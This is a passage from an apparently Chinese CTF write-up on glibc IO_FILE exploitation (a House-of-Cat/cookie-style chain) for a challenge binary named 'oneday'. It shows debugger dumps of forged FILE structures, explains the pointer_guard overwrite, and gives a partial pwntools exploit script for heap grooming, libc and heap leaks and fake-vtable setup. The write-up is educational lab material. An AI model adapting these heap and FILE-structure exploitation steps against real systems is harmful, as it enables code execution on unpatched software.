    <span class="n">_mode</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
    <span class="n">_unused2</span> <span class="o">=</span> <span class="sc">'\000'</span> <span class="o">&lt;</span><span class="n">repeats</span> <span class="mi">19</span> <span class="n">times</span><span class="o">&gt;</span>
  <span class="p">},</span>
  <span class="n">vtable</span> <span class="o">=</span> <span class="mh">0x7ffff7df3d20</span> <span class="o">&lt;</span><span class="n">_IO_wstrn_jumps</span><span class="o">&gt;</span>
<span class="p">}</span>

</pre></td></tr></tbody></table></code></pre></div></div>

<p>我们把chain改成了0x910，vtable改成了_IO_wstrn_jumps(跳转到<code class="language-plaintext highlighter-rouge">_IO_wstrn_overflow</code>),接着看一下0x910这个fake file结构体</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
</pre></td><td class="rouge-code"><pre><span class="n">pwndbg</span><span class="o">&gt;</span> <span class="n">p</span> <span class="o">*</span><span class="p">(</span><span class="k">struct</span> <span class="n">_IO_cookie_file</span><span class="o">*</span><span class="p">)</span> <span class="mh">0x555555606910</span>
<span class="err">$</span><span class="mi">4</span> <span class="o">=</span> <span class="p">{</span>
  <span class="n">__fp</span> <span class="o">=</span> <span class="p">{</span>
    <span class="n">file</span> <span class="o">=</span> <span class="p">{</span>
      <span class="n">_flags</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
      <span class="n">_IO_read_ptr</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">,</span>
      <span class="n">_IO_read_end</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">,</span>
      <span class="n">_IO_read_base</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">,</span>
      <span class="n">_IO_write_base</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">,</span>
      <span class="n">_IO_write_ptr</span> <span class="o">=</span> <span class="mh">0x1</span> <span class="o">&lt;</span><span class="n">error</span><span class="o">:</span> <span class="n">Cannot</span> <span class="n">access</span> <span class="n">memory</span> <span class="n">at</span> <span class="n">address</span> <span class="mh">0x1</span><span class="o">&gt;</span><span class="p">,</span>
      <span class="n">_IO_write_end</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">,</span>
      <span class="n">_IO_buf_base</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">,</span>
      <span class="n">_IO_buf_end</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">,</span>
      <span class="n">_IO_save_base</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">,</span>
      <span class="n">_IO_backup_base</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">,</span>
      <span class="n">_IO_save_end</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">,</span>
      <span class="n">_markers</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">,</span>
      <span class="n">_chain</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">,</span>
      <span class="n">_fileno</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
      <span class="n">_flags2</span> <span class="o">=</span> <span class="mi">8</span><span class="p">,</span>
      <span class="n">_old_offset</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span>
      <span class="n">_cur_column</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
      <span class="n">_vtable_offset</span> <span class="o">=</span> <span class="mi">0</span> <span class="sc">'\000'</span><span class="p">,</span>
      <span class="n">_shortbuf</span> <span class="o">=</span> <span class="s">""</span><span class="p">,</span>
      <span class="n">_lock</span> <span class="o">=</span> <span class="mh">0x7ffff7df5720</span> <span class="o">&lt;</span><span class="n">_IO_stdfile_2_lock</span><span class="o">&gt;</span><span class="p">,</span>
      <span class="n">_offset</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span>
      <span class="n">_codecvt</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">,</span>
      <span class="n">_wide_data</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">,</span>
      <span class="n">_freeres_list</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">,</span>
      <span class="n">_freeres_buf</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">,</span>
      <span class="n">__pad5</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
      <span class="n">_mode</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
      <span class="n">_unused2</span> <span class="o">=</span> <span class="sc">'\000'</span> <span class="o">&lt;</span><span class="n">repeats</span> <span class="mi">19</span> <span class="n">times</span><span class="o">&gt;</span>
    <span class="p">},</span>
    <span class="n">vtable</span> <span class="o">=</span> <span class="mh">0x7ffff7df3b38</span> <span class="o">&lt;</span><span class="n">_IO_cookie_jumps</span><span class="o">+</span><span class="mi">88</span><span class="o">&gt;</span>
  <span class="p">},</span>
  <span class="n">__cookie</span> <span class="o">=</span> <span class="mh">0x555555606a10</span><span class="p">,</span>
  <span class="n">__io_functions</span> <span class="o">=</span> <span class="p">{</span>
    <span class="n">read</span> <span class="o">=</span> <span class="mh">0x5555456812400000</span><span class="p">,</span>
    <span class="n">write</span> <span class="o">=</span> <span class="mh">0x6661616566616164</span><span class="p">,</span>
    <span class="n">seek</span> <span class="o">=</span> <span class="mh">0x6661616766616166</span><span class="p">,</span>
    <span class="n">close</span> <span class="o">=</span> <span class="mh">0x7ffff7cfd449</span> <span class="o">&lt;</span><span class="n">__lockf64</span><span class="o">+</span><span class="mi">73</span><span class="o">&gt;</span>
  <span class="p">}</span>
<span class="p">}</span>

</pre></td></tr></tbody></table></code></pre></div></div>

<p><img src="/assets/2025-11-23-IOstudy.assets/image-20250927195240837.png" alt="image-20250927195240837" /></p>

<p>然后又将rbp的值给rdx，这里就将pointer_guard的值给修改了。而rbp就是f1._wide_data = guard</p>

<p>传入的值，这里修改了point_guard的值</p>

<p>然后继续执行下一个fake file结构体</p>

<p><img src="/assets/2025-11-23-IOstudy.assets/image-20250927195811077.png" alt="image-20250927195811077" /></p>

<p>进行加密操作</p>

<p><img src="/assets/2025-11-23-IOstudy.assets/image-20250927200029033.png" alt="image-20250927200029033" /></p>

<p>加密后正好执行我们的gadget</p>

<p><img src="/assets/2025-11-23-IOstudy.assets/image-20250927200511852.png" alt="image-20250927200511852" /></p>

<p><img src="/assets/2025-11-23-IOstudy.assets/image-20250927201152950.png" alt="image-20250927201152950" /></p>

<p>后面就开始执行rop链了</p>

<p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250925200800931.png" alt="image-20250925200800931" /></p>

<p>可以知道为什么target_addr的地址要加0x20，因为经过<code class="language-plaintext highlighter-rouge">call qword ptr [rax + 0x18]</code>后，可以直接调用_IO_cookie_read函数</p>

<p>拿到flag</p>

<p><img src="/assets/2025-11-23-IOstudy.assets/image-20250927201315427.png" alt="image-20250927201315427" /></p>

<p>关于第一个IO结构体的_chain地址为什么是<code class="language-plaintext highlighter-rouge">chain = heap_base + 0x17e0 + 0x30 + 0x100</code>，因为第一个large bin距离heapbase的偏移是0x17e0，然后由于分配2个medium大小的chunk后的下一个指向的chunk3，与chunk1的偏移是0x30(0x54-0x24),上文提到过，然后f1与f2的距离有0x100的偏移，所以说___chain的地址就是f2的地址</p>

<p>exp:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
134
135
136
137
138
139
140
141
142
143
144
145
146
147
148
149
150
151
152
153
154
155
156
157
158
159
160
161
162
163
164
165
166
167
168
169
170
171
172
173
174
175
176
177
178
179
180
181
182
183
184
185
186
187
188
189
190
191
192
193
194
195
196
197
198
199
200
201
202
203
204
205
206
207
208
209
210
211
212
213
214
215
216
217
218
219
220
221
222
223
224
225
</pre></td><td class="rouge-code"><pre><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="n">pwncli</span> <span class="kn">import</span><span class="o">*</span> 
<span class="kn">from</span> <span class="n">ctypes</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">pwn</span> <span class="o">=</span> <span class="sh">'</span><span class="s">./oneday</span><span class="sh">'</span>
<span class="n">libc</span> <span class="o">=</span> <span class="nc">ELF</span><span class="p">(</span><span class="sh">"</span><span class="s">./libc.so.6</span><span class="sh">"</span><span class="p">)</span>
<span class="k">if</span> <span class="n">args</span><span class="p">[</span><span class="sh">'</span><span class="s">REMOTE</span><span class="sh">'</span><span class="p">]:</span>
    <span class="n">io</span> <span class="o">=</span> <span class="nf">remote</span><span class="p">(</span><span class="sh">'</span><span class="s">192.168.18.22</span><span class="sh">'</span><span class="p">,</span> <span class="mi">8888</span><span class="p">)</span>
<span class="k">else</span><span class="p">:</span>
    <span class="n">io</span> <span class="o">=</span> <span class="nf">process</span><span class="p">(</span><span class="n">pwn</span><span class="p">)</span>
    <span class="c1">#io = process(['setarch','$(uname -m)','-R','./oneday'])
</span>
<span class="nf">context</span><span class="p">(</span><span class="n">log_level</span><span class="o">=</span><span class="sh">'</span><span class="s">debug</span><span class="sh">'</span><span class="p">)</span>
<span class="c1">#context.terminal = ['tmux','splitw','-h']
</span><span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">elf</span> <span class="o">=</span> <span class="nc">ELF</span><span class="p">(</span><span class="n">pwn</span><span class="p">)</span>
<span class="n">rop</span> <span class="o">=</span> <span class="nc">ROP</span><span class="p">(</span><span class="n">context</span><span class="p">.</span><span class="n">binary</span><span class="p">)</span>

<span class="n">s</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span><span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">sa</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">text</span><span class="p">,</span> <span class="n">data</span><span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="nf">sendafter</span><span class="p">(</span><span class="n">text</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
<span class="n">sl</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span><span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">sla</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">text</span><span class="p">,</span> <span class="n">data</span><span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="n">text</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
<span class="n">r</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">num</span><span class="o">=</span><span class="mi">4096</span><span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="n">num</span><span class="p">)</span>
<span class="n">ru</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">text</span><span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="n">text</span><span class="p">)</span>
<span class="n">pr</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">num</span><span class="o">=</span><span class="mi">4096</span><span class="p">:</span> <span class="nf">print</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="n">num</span><span class="p">))</span>
<span class="n">inter</span> <span class="o">=</span> <span class="k">lambda</span><span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>

<span class="n">l32</span> <span class="o">=</span> <span class="k">lambda</span><span class="p">:</span> <span class="nf">u32</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="se">\xf7</span><span class="sh">'</span><span class="p">)[</span><span class="o">-</span><span class="mi">4</span><span class="p">:].</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">))</span>
<span class="n">l64</span> <span class="o">=</span> <span class="k">lambda</span><span class="p">:</span> <span class="nf">u64</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="se">\x7f</span><span class="sh">'</span><span class="p">)[</span><span class="o">-</span><span class="mi">6</span><span class="p">:].</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">))</span>
<span class="n">uu32</span> <span class="o">=</span> <span class="k">lambda</span><span class="p">:</span> <span class="nf">u32</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">4</span><span class="p">).</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">))</span>
<span class="n">uu32_hex</span> <span class="o">=</span> <span class="k">lambda</span><span class="p">:</span> <span class="nf">int</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">0x</span><span class="sh">'</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span> <span class="o">+</span> <span class="nf">r</span><span class="p">(</span><span class="mi">8</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span>
<span class="n">uu64</span> <span class="o">=</span> <span class="k">lambda</span><span class="p">:</span> <span class="nf">u64</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">).</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">))</span>
<span class="n">uu64_hex</span> <span class="o">=</span> <span class="k">lambda</span><span class="p">:</span> <span class="nf">int</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">0x</span><span class="sh">'</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span> <span class="o">+</span> <span class="nf">r</span><span class="p">(</span><span class="mi">12</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span>
<span class="n">uuu64</span> <span class="o">=</span> <span class="k">lambda</span><span class="p">:</span> <span class="nf">u64</span><span class="p">(</span><span class="nf">ru</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="se">\x7f</span><span class="sh">'</span><span class="p">)[</span><span class="o">-</span><span class="mi">6</span><span class="p">:].</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">))</span>
<span class="n">uuuu64</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">target</span><span class="p">:</span> <span class="nf">u64</span><span class="p">((</span><span class="nf">ru</span><span class="p">(</span><span class="n">target</span><span class="p">)[</span><span class="o">-</span><span class="mi">1</span><span class="p">:]</span> <span class="o">+</span> <span class="nf">r</span><span class="p">(</span><span class="mi">5</span><span class="p">)).</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">))</span>

<span class="n">int16</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span><span class="p">:</span> <span class="nf">int</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span>

<span class="n">lg</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">s</span><span class="p">,</span> <span class="n">num</span><span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="nf">success</span><span class="p">(</span><span class="sh">'</span><span class="s">%s -&gt; 0x%x</span><span class="sh">'</span> <span class="o">%</span> <span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">num</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">get_sb</span><span class="p">():</span>
    <span class="k">return</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="sh">'</span><span class="s">system</span><span class="sh">'</span><span class="p">],</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="nf">next</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="nf">search</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">/bin/sh</span><span class="se">\x00</span><span class="sh">'</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">get_orw</span><span class="p">():</span>
    <span class="k">return</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="sh">'</span><span class="s">open</span><span class="sh">'</span><span class="p">],</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="sh">'</span><span class="s">read</span><span class="sh">'</span><span class="p">],</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="sh">'</span><span class="s">write</span><span class="sh">'</span><span class="p">]</span>

<span class="k">def</span> <span class="nf">debug</span><span class="p">(</span><span class="n">breakpoints</span><span class="o">=</span><span class="bp">None</span><span class="p">):</span>
    <span class="k">if</span> <span class="n">breakpoints</span> <span class="ow">is</span> <span class="bp">None</span><span class="p">:</span>
        <span class="n">breakpoints</span> <span class="o">=</span> <span class="p">[</span><span class="sh">"</span><span class="s">__call_tls_dtors</span><span class="sh">"</span><span class="p">]</span>
    <span class="k">elif</span> <span class="nf">isinstance</span><span class="p">(</span><span class="n">breakpoints</span><span class="p">,</span> <span class="nb">str</span><span class="p">):</span>
        <span class="n">breakpoints</span> <span class="o">=</span> <span class="p">[</span><span class="n">breakpoints</span><span class="p">]</span>
    <span class="n">script</span> <span class="o">=</span> <span class="sh">""</span>
    <span class="k">for</span> <span class="n">bp</span> <span class="ow">in</span> <span class="n">breakpoints</span><span class="p">:</span>
        <span class="n">script</span> <span class="o">+=</span> <span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="n">bp</span><span class="si">}</span><span class="se">\n</span><span class="sh">"</span>
    <span class="n">gdb</span><span class="p">.</span><span class="nf">attach</span><span class="p">(</span><span class="n">proc</span><span class="p">.</span><span class="nf">pidof</span><span class="p">(</span><span class="n">io</span><span class="p">)[</span><span class="mi">0</span><span class="p">],</span> <span class="n">script</span><span class="p">)</span>
    <span class="nf">pause</span><span class="p">()</span>

<span class="k">def</span> <span class="nf">fmt</span><span class="p">(</span><span class="n">value</span><span class="p">,</span> <span class="n">offset</span><span class="o">=</span><span class="mi">14</span><span class="p">,</span> <span class="n">size</span><span class="o">=</span><span class="sh">'</span><span class="s">hhn</span><span class="sh">'</span><span class="p">):</span>
    <span class="k">if</span> <span class="n">size</span> <span class="o">==</span> <span class="sh">'</span><span class="s">hhn</span><span class="sh">'</span><span class="p">:</span>
        <span class="n">num</span> <span class="o">=</span> <span class="n">value</span> <span class="o">&amp;</span> <span class="mh">0xff</span>
    <span class="k">elif</span> <span class="n">size</span> <span class="o">==</span> <span class="sh">'</span><span class="s">hn</span><span class="sh">'</span><span class="p">:</span>
        <span class="n">num</span> <span class="o">=</span> <span class="n">value</span> <span class="o">&amp;</span> <span class="mh">0xffff</span>
    <span class="k">elif</span> <span class="n">size</span> <span class="o">==</span> <span class="sh">'</span><span class="s">n</span><span class="sh">'</span><span class="p">:</span>
        <span class="n">num</span> <span class="o">=</span> <span class="n">value</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">'</span><span class="s">%</span><span class="si">{</span><span class="n">num</span><span class="si">}</span><span class="s">c%</span><span class="si">{</span><span class="n">offset</span><span class="si">}</span><span class="s">$</span><span class="si">{</span><span class="n">size</span><span class="si">}</span><span class="sh">'</span><span class="p">.</span><span class="nf">encode</span><span class="p">()</span>
    <span class="c1">#value 是格式化字符串偏移          
</span>    <span class="k">return</span> <span class="n">payload</span>

<span class="n">lss</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">s</span><span class="p">:</span> <span class="n">log</span><span class="p">.</span><span class="nf">success</span><span class="p">(</span><span class="sh">'</span><span class="se">\033</span><span class="s">[1;31;40m%s --&gt; 0x%x </span><span class="se">\033</span><span class="s">[0m</span><span class="sh">'</span> <span class="o">%</span> <span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="nf">eval</span><span class="p">(</span><span class="n">s</span><span class="p">)))</span>

<span class="k">def</span> <span class="nf">cat_flag</span><span class="p">():</span>
    <span class="n">flag_header</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">flag{</span><span class="sh">'</span>
    <span class="nf">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
    <span class="nf">sl</span><span class="p">(</span><span class="sh">'</span><span class="s">cat flag</span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">ru</span><span class="p">(</span><span class="n">flag_header</span><span class="p">)</span>
    <span class="n">flag</span> <span class="o">=</span> <span class="n">flag_header</span> <span class="o">+</span> <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">}</span><span class="sh">'</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="sh">'</span><span class="s">}</span><span class="sh">'</span>
    <span class="nf">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>

<span class="c1">#asm(shellcraft.sh()).ljust(0x108,b'a')
</span>
<span class="k">def</span> <span class="nf">set_key</span><span class="p">(</span><span class="n">key</span><span class="p">):</span>
    <span class="nf">sla</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">key &gt;&gt;</span><span class="se">\n</span><span class="sh">'</span><span class="p">,</span><span class="nf">str</span><span class="p">(</span><span class="n">key</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="n">choise</span><span class="p">):</span>
   <span class="nf">sla</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">command:</span><span class="sh">'</span><span class="p">,</span><span class="sa">b</span><span class="sh">'</span><span class="s">1</span><span class="sh">'</span><span class="p">)</span>
   <span class="nf">sla</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">choise: </span><span class="sh">'</span><span class="p">,</span><span class="nf">str</span><span class="p">(</span><span class="n">choise</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">dele</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
    <span class="nf">sla</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">command: </span><span class="se">\n</span><span class="sh">'</span><span class="p">,</span><span class="sa">b</span><span class="sh">'</span><span class="s">2</span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">sla</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">Index: </span><span class="sh">'</span><span class="p">,</span><span class="nf">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span><span class="n">commend</span><span class="p">):</span>
    <span class="nf">sla</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">command:</span><span class="sh">'</span><span class="p">,</span><span class="sa">b</span><span class="sh">'</span><span class="s">3</span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">sla</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">Index: </span><span class="sh">'</span><span class="p">,</span><span class="nf">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
    <span class="nf">sa</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">Message: </span><span class="se">\n</span><span class="sh">'</span><span class="p">,</span><span class="n">commend</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">show</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
    <span class="nf">sla</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">command:</span><span class="sh">'</span><span class="p">,</span><span class="sa">b</span><span class="sh">'</span><span class="s">4</span><span class="sh">'</span><span class="p">)</span>   
    <span class="nf">sla</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">Index: </span><span class="sh">'</span><span class="p">,</span><span class="nf">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
   
<span class="k">def</span> <span class="nf">exit</span><span class="p">():</span>
    <span class="nf">sla</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">command:</span><span class="sh">'</span><span class="p">,</span><span class="sa">b</span><span class="sh">'</span><span class="s">6</span><span class="sh">'</span><span class="p">)</span>  

<span class="nf">set_key</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span>
<span class="nf">debug</span><span class="p">(</span><span class="sh">"</span><span class="s">call (void)signal(SIGALRM, SIG_IGN)</span><span class="sh">"</span><span class="p">)</span> 
<span class="nf">add</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span> <span class="c1">#0
</span><span class="nf">add</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span> <span class="c1">#1
</span><span class="nf">add</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="c1">#2
</span><span class="nf">dele</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
<span class="nf">dele</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
<span class="nf">dele</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>

<span class="nf">add</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="c1">#3
</span><span class="nf">add</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="c1">#4
</span><span class="nf">add</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="c1">#5
</span><span class="nf">add</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="c1">#6
</span>
<span class="nf">dele</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
<span class="nf">dele</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
<span class="nf">show</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>

<span class="nf">ru</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">Message: </span><span class="se">\n</span><span class="sh">'</span><span class="p">)</span>
<span class="n">libc_base</span> <span class="o">=</span> <span class="nf">uu64</span><span class="p">()</span> <span class="o">-</span> <span class="mh">0x1f2cc0</span>
<span class="nf">lg</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">libc_base</span><span class="sh">'</span><span class="p">,</span><span class="n">libc_base</span><span class="p">)</span>
<span class="n">io</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
<span class="n">heap_base</span> <span class="o">=</span> <span class="nf">uu64</span><span class="p">()</span> <span class="o">-</span> <span class="mh">0x17f0</span>
<span class="nf">lg</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">heap_base</span><span class="sh">'</span><span class="p">,</span><span class="n">heap_base</span><span class="p">)</span>


<span class="nf">dele</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
<span class="nf">dele</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span>
<span class="nf">add</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span> <span class="c1">#7
</span><span class="nf">add</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="c1">#8
</span><span class="nf">add</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="c1">#9
</span><span class="nf">pause</span><span class="p">()</span>
<span class="nf">dele</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span>
<span class="nf">add</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>

<span class="n">target_addr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="sh">'</span><span class="s">_IO_list_all</span><span class="sh">'</span><span class="p">]</span> 
<span class="nf">lg</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">_IO_list_all</span><span class="sh">'</span><span class="p">,</span><span class="n">target_addr</span><span class="p">)</span>
<span class="n">_IO_cookie_jumps</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x1f3ae0</span>
<span class="n">_IO_wstrn_jumps</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x1f3d20</span>
<span class="n">_IO_stdfile_1_lock</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x1f5720</span>
